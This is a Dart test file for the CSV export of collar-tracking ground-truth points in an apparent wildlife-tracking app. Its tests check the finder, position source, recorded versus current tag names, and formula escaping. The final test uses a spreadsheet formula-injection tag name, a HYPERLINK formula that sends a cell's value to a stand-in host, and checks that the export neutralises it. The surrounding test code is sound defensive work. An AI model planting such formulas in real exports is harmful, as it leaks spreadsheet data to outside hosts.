import 'package:csv/csv.dart';
import 'package:flutter_test/flutter_test.dart';
import 'package:tritrack/data/csv/actual_tag_location_csv.dart';
import 'package:tritrack/data/models/tag_version.dart';
import 'package:tritrack_sync/tritrack_sync.dart';

import '../fixtures.dart';

void main() {
  // Task 11.93: who found the point, so `found_by` can be a name.
  final finder = sampleUser();

  List<String> headerOf(String csv) =>
      Csv().decode(csv)[0].map((h) => h.toString()).toList();

  group('ActualTagLocationCsv.export', () {
    test('every field a truth point carries reaches the file', () {
      final point = sampleActualLocation();
      final tag = sampleTag();

      final csvText = ActualTagLocationCsv.export(
        [point],
        tagsById: {tag.tagId: tag},
        usersById: {finder.userId: finder},
        recordedStates: {
          point.locationId:
              RecordedTagState(tag: tag, version: sampleTagVersion()),
        },
      );

      final rows = Csv().decode(csvText);
      expect(rows, hasLength(2));
      final header = headerOf(csvText);
      Object? col(String name) => rows[1][header.indexOf(name)];

      expect(col('location_id'), point.locationId);
      // Both names, which is the point of the column pair.
      expect(col('tag_name'), 'Coco');
      expect(col('tag_current_name'), 'Coco');
      expect(col('tag_values_recorded'), 'yes');
      // The two fields that decide what the point means.
      expect(col('found_kind'), 'animal_and_collar');
      expect(col('precision_m'), '15.0');
      // Position and time.
      expect(col('latitude'), '35.196');
      expect(col('longitude'), '-111.616');
      expect(col('timestamp_utc'), point.timestampUtc.toIso8601String());
      // Apostrophe-prefixed by `SpreadsheetSafeCsv`, exactly as the
      // observation export does it: a leading `-` opens a formula in Excel.
      expect(col('timezone_offset'), "'-07:00");
      expect(col('notes'), 'found collar');
      // Task 11.93: who found it, and how the coordinate was got.
      expect(col('found_by'), 'Sam Ranger');
      expect(col('position_source'), 'gps_fix');
    });

    // **Task 11.93's no-backfill rule, stated as what the file says.** A point
    // recorded before schema v11 has no finder and no position source, and the
    // export must leave both cells empty rather than filling them from
    // `last_modified_by` or assuming a GPS fix — either would state a fact
    // nobody recorded, which is the whole reason this table has a no-backfill
    // rule.
    test('a point from before schema v11 exports both new columns empty', () {
      final point = sampleActualLocation(userId: null, positionSource: null);
      final tag = sampleTag();
      final csvText = ActualTagLocationCsv.export(
        [point],
        tagsById: {tag.tagId: tag},
        usersById: {finder.userId: finder},
      );
      final header = headerOf(csvText);
      Object? col(String name) => Csv().decode(csvText)[1][header.indexOf(name)];

      expect(col('found_by'), '');
      expect(col('position_source'), '');
      expect(
        col('found_by'),
        isNot(contains('Sam')),
        reason: 'the row this point carries in `last_modified_by` is Sam '
            'Ranger; using it here would name a finder nobody recorded',
      );
    });

    test('a finder this device does not hold exports the id, not a blank', () {
      final point = sampleActualLocation(userId: 'user-elsewhere');
      final tag = sampleTag();
      final csvText = ActualTagLocationCsv.export(
        [point],
        tagsById: {tag.tagId: tag},
        usersById: const {},
      );
      final header = headerOf(csvText);
      expect(
        Csv().decode(csvText)[1][header.indexOf('found_by')],
        'user-elsewhere',
        reason: '"this point names somebody we cannot name" and "this point '
            'names nobody" are different facts, and a blank would collapse '
            'them',
      );
    });

    test('a fix later moved by hand exports as its own source', () {
      final tag = sampleTag();
      final csvText = ActualTagLocationCsv.export(
        [
          for (final s in PositionSource.values)
            sampleActualLocation(id: 'loc-${s.db}', positionSource: s),
        ],
        tagsById: {tag.tagId: tag},
        usersById: {finder.userId: finder},
      );
      final header = headerOf(csvText);
      expect(
        Csv()
            .decode(csvText)
            .skip(1)
            .map((r) => r[header.indexOf('position_source')]),
        ['gps_fix', 'manual_pin', 'manual_entry', 'gps_fix_adjusted'],
        reason: 'a point measured at the collar, one eyeballed across 200 m of '
            'savannah, and one that began as a fix and was later nudged are '
            'three different facts about how much to trust the coordinate',
      );
    });

    // **The acceptance this task states in the harm it prevents.** The
    // `tag_version_id` column exists precisely so an export made after somebody
    // renames a collar can still be lined up against one made before, and
    // nothing had ever read it. A rename is the ordinary case — "148.520"
    // becomes "F-07 Juniper" the week the animal gets a name.
    test('a rename changes the current name and not the recorded one', () {
      final point = sampleActualLocation();
      final asRecorded = sampleTagVersion(tagName: 'Coco', frequencyMhz: 150.325);

      String exportWith(dynamic tag) => ActualTagLocationCsv.export(
            [point],
            tagsById: {tag.tagId: tag},
            usersById: {finder.userId: finder},
            recordedStates:
                {point.locationId: RecordedTagState(tag: tag, version: asRecorded)},
          );

      final header = headerOf(exportWith(sampleTag()));
      Object? col(String csv, String name) =>
          Csv().decode(csv)[1][header.indexOf(name)];

      final before = exportWith(sampleTag());
      final after = exportWith(
        sampleTag(tagName: 'F-07 Juniper', frequencyMhz: 150.51),
      );

      expect(
        col(after, 'tag_name'),
        col(before, 'tag_name'),
        reason: 'somebody found the collar called Coco, whatever it is called '
            'now — an export made today must line up with one made last month',
      );
      expect(col(after, 'tag_frequency_mhz'), col(before, 'tag_frequency_mhz'));
      // And the new name is there too, because that is the one a person
      // reading the spreadsheet recognises.
      expect(col(after, 'tag_current_name'), 'F-07 Juniper');
      expect(col(before, 'tag_current_name'), 'Coco');
    });

    test('a point whose tag has no version history says so instead of '
        'borrowing todays name', () {
      final point = sampleActualLocation(tagVersionId: null);
      final tag = sampleTag(tagName: 'F-07 Juniper');

      final csvText = ActualTagLocationCsv.export(
        [point],
        tagsById: {tag.tagId: tag},
        usersById: {finder.userId: finder},
        recordedStates: {
          // What `recordedStatesForRows` returns for a point whose tag has no
          // version: the tag row, and no version.
          point.locationId: RecordedTagState(tag: tag, version: null),
        },
      );
      final header = headerOf(csvText);
      Object? col(String name) => Csv().decode(csvText)[1][header.indexOf(name)];

      expect(col('tag_values_recorded'), 'no');
      expect(
        col('tag_name'),
        '',
        reason: 'an empty cell says "we do not know what it was called then"; '
            'filling it from the tag row would state a name nobody recorded',
      );
      expect(col('tag_current_name'), 'F-07 Juniper');
    });

    test('found_kind is exported verbatim for all three kinds', () {
      final points = [
        for (final k in GroundTruthKind.values)
          sampleActualLocation(id: 'loc-${k.db}', foundKind: k),
      ];
      final tag = sampleTag();
      final csvText =
          ActualTagLocationCsv.export(points,
          tagsById: {tag.tagId: tag}, usersById: {finder.userId: finder});
      final header = headerOf(csvText);
      final rows = Csv().decode(csvText).skip(1).toList();

      expect(
        rows.map((r) => r[header.indexOf('found_kind')]),
        ['animal_and_collar', 'animal_only', 'collar_only'],
        reason: 'a future accuracy figure counts animal-and-collar points by '
            'default and the other kinds only deliberately, so whoever does '
            'that arithmetic must be able to make the split from this file',
      );
    });

    test('a tag name that looks like a spreadsheet formula is neutralised', () {
      final point = sampleActualLocation();
      final tag = sampleTag(tagName: '=HYPERLINK("http://x/?p="&L2)');
      final csvText = ActualTagLocationCsv.export(
        [point],
        tagsById: {tag.tagId: tag},
        usersById: {finder.userId: finder},
      );
      expect(csvText, contains("'=HYPERLINK"));
      expect(
        csvText.contains('\n=HYPERLINK'),
        isFalse,
        reason: 'finding L-3: every encoder goes through SpreadsheetSafeCsv',
      );
    });
  });
}
